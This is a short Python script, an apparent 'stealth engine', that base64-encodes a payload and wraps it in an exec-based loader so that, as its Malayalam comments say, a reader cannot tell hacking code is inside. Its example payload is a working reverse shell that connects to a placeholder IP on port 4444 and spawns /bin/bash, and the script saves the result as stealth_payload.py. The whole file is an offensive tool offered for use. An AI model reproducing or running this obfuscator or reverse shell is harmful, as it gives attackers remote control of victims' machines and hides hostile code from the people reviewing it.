import base64
import random
import string

def obfuscate_payload(code):
    print("[*] X🔴PACKET™ Stealth Engine: Obfuscating Payload...")
    
    # 1. Base64 Encoding (First Layer)
    encoded_bytes = base64.b64encode(code.encode())
    
    # 2. Random Key Generation
    junk_key = ''.join(random.choices(string.ascii_letters, k=16))
    
    # 3. Layered Wrapper Construction
    # ഈ കോഡ് വായിക്കുന്ന ഒരാൾക്ക് ഇതിനുള്ളിൽ ഒറിജിനൽ ഹാക്കിംഗ് കോഡ് ഉണ്ടെന്ന് മനസ്സിലാകില്ല.
    obfuscated_code = f"""
import base64
# Security Bypass Metadata: {junk_key}
_0x4f2a = "{encoded_bytes.decode()}"
exec(base64.b64decode(_0x4f2a).decode())
"""
    return obfuscated_code

if __name__ == "__main__":
    # Example: നിന്റെ ഒരു ബേസിക് റിവേഴ്സ് ഷെൽ കോഡ് ഇവിടെ നൽകാം
    original_script = 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
    
    stealth_payload = obfuscate_payload(original_script)
    
    with open("stealth_payload.py", "w") as f:
        f.write(stealth_payload)
    
    print("[🔥] OBFUSCATION COMPLETE: Saved as stealth_payload.py")
